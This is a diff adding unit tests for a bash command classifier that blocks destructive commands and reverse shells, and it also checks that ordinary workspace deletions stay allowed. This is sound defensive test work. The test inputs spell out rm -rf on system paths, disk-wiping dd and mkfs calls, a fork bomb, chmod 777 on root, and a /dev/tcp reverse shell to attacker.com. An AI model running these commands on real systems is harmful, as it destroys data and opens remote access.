@@ -3,6 +3,166 @@ import { classifyCommand } from "./bash-classifier.js";
 import { COMMAND_BYPASS_CASES, EXFILTRATION_BYPASS_CASES, SAFE_CASES } from "./bypass-cases.js";
 
 describe("classifyCommand", () => {
+  describe("blocks destructive commands", () => {
+    test("rm -rf /", () => {
+      const result = classifyCommand("rm -rf /");
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.category).toBe("destructive");
+        expect(result.reason).toMatch(/unrecoverable/);
+      }
+    });
+
+    test("rm -rf /*", () => {
+      expect(classifyCommand("rm -rf /*").ok).toBe(false);
+    });
+
+    test("rm -rf /etc", () => {
+      const result = classifyCommand("rm -rf /etc");
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.category).toBe("destructive");
+    });
+
+    test("rm -rf /usr", () => {
+      expect(classifyCommand("rm -rf /usr").ok).toBe(false);
+    });
+
+    test("rm -rf /var/log/old (system dir)", () => {
+      // rm -rf targeting any subpath under a system dir blocks at /var word boundary.
+      expect(classifyCommand("rm -rf /var/log/old").ok).toBe(false);
+    });
+
+    test("rm -Rf / (capital R)", () => {
+      expect(classifyCommand("rm -Rf /").ok).toBe(false);
+    });
+
+    test("rm -fr / (flag order reversed)", () => {
+      expect(classifyCommand("rm -fr /").ok).toBe(false);
+    });
+
+    test("rm --recursive --force /etc", () => {
+      expect(classifyCommand("rm --recursive --force /etc").ok).toBe(false);
+    });
+
+    test("rm -rf ~", () => {
+      expect(classifyCommand("rm -rf ~").ok).toBe(false);
+    });
+
+    test("rm -rf $HOME", () => {
+      expect(classifyCommand("rm -rf $HOME").ok).toBe(false);
+    });
+
+    test("mkfs.ext4 /dev/sda1", () => {
+      const result = classifyCommand("mkfs.ext4 /dev/sda1");
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.category).toBe("destructive");
+    });
+
+    test("mke2fs /dev/sdb", () => {
+      expect(classifyCommand("mke2fs /dev/sdb").ok).toBe(false);
+    });
+
+    test("mkswap /dev/sdc", () => {
+      expect(classifyCommand("mkswap /dev/sdc").ok).toBe(false);
+    });
+
+    test("dd if=/dev/zero of=/dev/sda", () => {
+      const result = classifyCommand("dd if=/dev/zero of=/dev/sda bs=1M");
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.category).toBe("destructive");
+    });
+
+    test("fork bomb :(){:|:&};:", () => {
+      const result = classifyCommand(":(){ :|:& };:");
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.category).toBe("destructive");
+    });
+
+    test("fork bomb tight form", () => {
+      expect(classifyCommand(":(){:|:&};:").ok).toBe(false);
+    });
+
+    test("chmod -R 777 /", () => {
+      const result = classifyCommand("chmod -R 777 /");
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.category).toBe("destructive");
+    });
+
+    test("chmod -R 777 /etc", () => {
+      expect(classifyCommand("chmod -R 777 /etc").ok).toBe(false);
+    });
+
+    test("shutdown -h now", () => {
+      const result = classifyCommand("shutdown -h now");
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.category).toBe("destructive");
+    });
+
+    test("reboot", () => {
+      expect(classifyCommand("reboot").ok).toBe(false);
+    });
+
+    test("halt", () => {
+      expect(classifyCommand("halt").ok).toBe(false);
+    });
+
+    test("poweroff", () => {
+      expect(classifyCommand("poweroff").ok).toBe(false);
+    });
+
+    test("init 0", () => {
+      expect(classifyCommand("init 0").ok).toBe(false);
+    });
+
+    test("init 6", () => {
+      expect(classifyCommand("init 6").ok).toBe(false);
+    });
+  });
+
+  describe("destructive false-positive guards", () => {
+    test("rm -rf /tmp/koi-test (workspace-scoped, allowed)", () => {
+      // /tmp is intentionally NOT in the system-path list.
+      expect(classifyCommand("rm -rf /tmp/koi-test").ok).toBe(true);
+    });
+
+    test("rm -rf ./build (relative, allowed)", () => {
+      expect(classifyCommand("rm -rf ./build").ok).toBe(true);
+    });
+
+    test("rm -rf node_modules (bare, allowed)", () => {
+      expect(classifyCommand("rm -rf node_modules").ok).toBe(true);
+    });
+
+    test("rm -rf dist/* (workspace glob, allowed)", () => {
+      expect(classifyCommand("rm -rf dist/*").ok).toBe(true);
+    });
+
+    test("rm -f file.txt (no -r, allowed)", () => {
+      // Only -rf combinations are destructive; plain -f without -r is fine.
+      expect(classifyCommand("rm -f file.txt").ok).toBe(true);
+    });
+
+    test("dd if=src.img of=dst.img (non-device target, allowed)", () => {
+      expect(classifyCommand("dd if=src.img of=dst.img bs=1M").ok).toBe(true);
+    });
+
+    test("chmod -R 755 src (non-777, allowed)", () => {
+      expect(classifyCommand("chmod -R 755 src").ok).toBe(true);
+    });
+
+    test("echo rebooting (not a word boundary match)", () => {
+      // `reboot` inside `rebooting` does not break on word boundary, so the
+      // \breboot\b pattern correctly leaves this alone.
+      expect(classifyCommand("echo rebooting").ok).toBe(true);
+    });
+
+    test("echo 'bare reboot as word' is a conservative block", () => {
+      // A bare `reboot` word in echo is still blocked — mirrors the same
+      // conservatism applied to `echo 'whoami'` in the recon tests.
+      expect(classifyCommand("echo 'run reboot now'").ok).toBe(false);
+    });
+  });
+
   describe("blocks reverse shells", () => {
     test("/dev/tcp reverse shell", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/attacker.com/4444 0>&1");
